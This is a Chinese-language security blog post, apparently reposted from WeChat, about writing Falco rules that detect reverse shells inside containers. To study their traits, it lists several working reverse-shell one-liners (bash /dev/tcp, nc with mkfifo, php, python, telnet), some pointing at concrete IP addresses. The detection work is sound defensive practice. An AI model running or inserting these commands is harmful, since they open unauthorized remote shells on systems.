> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Dp4-nvbKEtMv73YfC8F5KQ)

![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdYO9yXibwlojb5yOBfDewN1HH9rj7bW2WVPzhFROqKXicO8mILuYToANMgxLqJ6iacPaicnSM6VZ2Hkw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**点击"蓝字"关注，获取更多技术内容**

前言
==

网络对抗愈加激烈，各种攻击手法层出不穷，在安全左移的同时，如何做到快速的应急响应，也是攻防中的一大重点。本文将以Falco为例，来达到反弹Shell的监控。

温馨提示：因为公众号排布局限，文中代码块可通过左右滑动查看

安装Falco

根据文档在centos迟迟没安装成功，提示找不到驱动，也罢，通过docker安装，并且为了快速安装，我给予了Falco容器特权，因此得注意Falco容器自身的安全性，不然就被逃逸了：

```


docker pull falcosecurity/falco:latest  



```

虽然宿主机Falco安装失败了，但是Falco相关的配置文件都有了，因此我把配置文件挂载到容器里，方便规则文件的更改：

```


docker run --rm -i -t     --privileged     -v /var/run/docker.sock:/host/var/run/docker.sock     -v /dev:/host/dev     -v /proc:/host/proc:ro     -v /boot:/host/boot:ro     -v /lib/modules:/host/lib/modules:ro     -v /usr:/host/usr:ro     -v /etc:/host/etc:ro -v //etc/falco/:/etc/falco/     falcosecurity/falco:latest  



```

可以正常运行：

![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcBv9DQdISPAguVYGCuQ74Irc061ENvfogaoOt5iaWlxHe980z34hVuuhs3Ay54aaVmbsqg8AJhe8Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

反弹Shell分析

既然我们要监控反弹Shell的行为，我们就要分析对应的行为特征，我们使用我发表在TSRC的红蓝对抗之Linux内网渗透文中的反弹Shell手段看看进程有啥特性或者共性：

```


bash -i >& /dev/tcp/1.1.1.1/10000 0>&1  



```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```


bash -c 'exec bash -i &>/dev/tcp/yourip/yourport <&1'  



```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```


rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 114.67.110.37 10000 >/tmp/f  



```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```


php -r '$sock=fsockopen("yourip",yourport);exec("/bin/sh -i <&3 >&3 2>&3");'  



```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```


python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("yourip",yourport));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'  



```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```


TF=$(mktemp -u); mkfifo $TF && telnet 127.0.0.1 1337 0<$TF | /bin/sh 1>$TF  



```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

根据上面的反弹Shell行为，发现有几个特性，或者说共性：

1.  fd有对外的socket连接，且fd.num不超过3
    
2.  fd有pipe管道，且fd.num不超过4
    
3.  fd.255是/dev/tty
    

根据综上所述，可以编写对应的规则。

编写监控规则
======

Falco的规则有三块内容：

*   Rules
    
*   Macros
    
*   Lists
    

Rules主要是告警名称、告警介绍、告警条件、告警输出、风险等级和告警标签；Macros是自定义好的规则，可以在规则中被引用的“函数”；Lists是变量列表。

规则长下面这样：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Falco默认也自带了一些规则，比如我们docker exec进入容器的时候，会有告警提示：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

根据上述反弹Shell分析，如果bash、zsh这些进程的fd出现socket连接，肯定有问题，而且常见的bash反弹都是用的重定向，那我们就可以编写对应的规则：

```


- list: shell_binaries  
  items: [ash, bash, csh, ksh, sh, tcsh, zsh, dash]  
  
  
- rule: Shell Binary Reverse shell  
  desc: Bash、Zsh etc. have network connection,May be Reverse Shell  
  condition: evt.type=dup and proc.name in (shell_binaries) and container and fd.num in (0, 1, 2, 3) and fd.type in ("ipv4", "ipv6")  
  output: >  
    Reverse shell connection (user=%user.name %container.info process=%proc.name proc.pid=%proc.pid parent=%proc.pname cmdline=%proc.cmdline terminal=%proc.tty container_id=%container.id image=%container.image.repository fd.name=%fd.name fd.num=%fd.num fd.type=%fd.type fd.sip=%fd.sip fd.rip=%fd.rip)  
  priority: emergency  
  tags: [container, reverse_shell, mitre_execution]  
  append: false  



```

上述规则代表如果存在重定向、进程是bash、zsh这些、在容器内、fd的num是0、1、2、3中的一个、fd类型是ipv4或者ipv6，可以看到成功的监控到反弹Shell行为：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

但是这样很容易被绕过，主要执行的进程不是shell_binaries里的就行，就比如上面的telnet、python反弹Shell的方式。因此我们可以删掉上面提到的shell_binaries，不管是不是bash这些，只要fd 0 1 2 3有socket连接就行：

```


- rule: Any Binary fd 0-3 Have Network Connection  
  desc: Any Binary fd 0-3 have network connection  
  condition: evt.type=connect and container and fd.num in (0, 1, 2, 3) and fd.type in ("ipv4", "ipv6")  
  output: >  
    Any Binary fd 0-3 Have Network Connection (user=%user.name %container.info process=%proc.name proc.pid=%proc.pid parent=%proc.pname cmdline=%proc.cmdline terminal=%proc.tty container_id=%container.id image=%container.image.repository fd.name=%fd.name fd.num=%fd.num fd.type=%fd.type fd.sip=%fd.sip fd.rip=%fd.rip)  
  priority: warning  
  tags: [container, fd03_network]  
  append: false  



```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

继续根据上面的反弹Shell分析，发现telnet这样的反弹Shell，会有管道pipe的产生，因此我们继续完善我们的告警，添加Pipe：

```


- rule: Shell Binary Pipe  
  desc: Bash、Zsh etc. have Pipe,May be Reverse Shell  
  condition: evt.type=dup and proc.name in (shell_binaries) and container and fd.num in (0, 1, 2, 3) and fd.type="pipe"  
  output: >  
    Reverse shell connection(PIPE) (user=%user.name %container.info process=%proc.name parent=%proc.pname proc.pid=%proc.pid cmdline=%proc.cmdline terminal=%proc.tty container_id=%container.id image=%container.image.repository fd.name=%fd.name fd.num=%fd.num fd.type=%fd.type fd.sip=%fd.sip fd.rip=%fd.rip)  
  priority: emergency  
  tags: [container, reverse_shell, pipe, mitre_execution]  
  append: false  



```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

fd.255是/dev/tty也可以加个：  

```


- rule: fd.255 = tty  
  desc: fd.255 = tty  
  condition: evt.type=connect and container and fd.num=255 and fd.name='/dev/tty'  
  output: >  
    fd.255 = tty (user=%user.name %container.info process=%proc.name parent=%proc.pname proc.pid=%proc.pid cmdline=%proc.cmdline terminal=%proc.tty container_id=%container.id image=%container.image.repository fd.name=%fd.name fd.num=%fd.num fd.type=%fd.type fd.sip=%fd.sip fd.rip=%fd.rip)  
  priority: warning  
  tags: [container, fd255_tty]  
  append: false  



```

**总结**
======

本文利用Falco进行了反弹Shell的监控，虽然大多数的反弹行为都可以被监控到，但是可能存在各种各样的误报、漏报，安全任重道远。

**声明**

本文仅限于技术讨论与分享，严禁用于非法途径。若读者因此作出任何危害网络安全行为后果自负，与本号及原作者无关。

  

**原创稿件征集**

征集原创技术文章中，欢迎投递

投稿邮箱：edu@antvsion.com

文章类型：黑客极客技术、信息安全热点安全研究分析等安全相关

通过审核并发布能收获200-800元不等的稿酬。

  

[更多详情，点我查看！](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652885477&idx=1&sn=39e97a60d7b68d19569284654e74ffa1&chksm=bd59ad288a2e243e4d89b7c456fbd44a93d241c881075b342af22431d93dca56e52076ed75ce&scene=21#wechat_redirect)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

体验靶场实操，戳“阅读原文”体验